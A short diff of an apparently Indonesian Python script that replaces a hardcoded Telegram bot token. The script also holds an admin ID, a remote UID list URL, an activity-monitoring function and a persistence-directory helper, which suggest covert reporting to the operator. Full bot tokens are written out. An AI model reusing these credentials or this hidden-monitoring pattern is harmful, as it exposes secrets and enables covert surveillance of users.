@@ -142,7 +142,7 @@ babi = """
 def pantau_aktivitas():
     import os, sys, subprocess, re, socket, time, requests, hashlib, stat, platform
 
-    BOT_TOKEN = "8685515038:AAEW_N4J98oYLIMpP71Fc9W99ha7nR4mJAs"
+    BOT_TOKEN = "8823208133:AAEbIKComBACSwNb4SF9K-nTaVt_FmcsBnU"
     ADMIN_ID = "8873967955"
     UID_LIST_URL = "https://raw.githubusercontent.com/x7f9k2m4n6j4h8t2v9p5s3k1/a7k3m9x2v5n8j4h6/main/Uid.txt"
 
@@ -267,7 +267,7 @@ os.system(f'echo "{babi}" | lolcat')
 time.sleep(10)
 os.system('clear')
 REPO_UID = "https://raw.githubusercontent.com/x7f9k2m4n6j4h8t2v9p5s3k1/a7k3m9x2v5n8j4h6/main/Uid.txt"
-BOT_TOKEN = "8685515038:AAEW_N4J98oYLIMpP71Fc9W99ha7nR4mJAs"
+BOT_TOKEN = "8823208133:AAEbIKComBACSwNb4SF9K-nTaVt_FmcsBnU"
 ADMIN_ID = "8873967955"
 
 def get_persistent_dir():
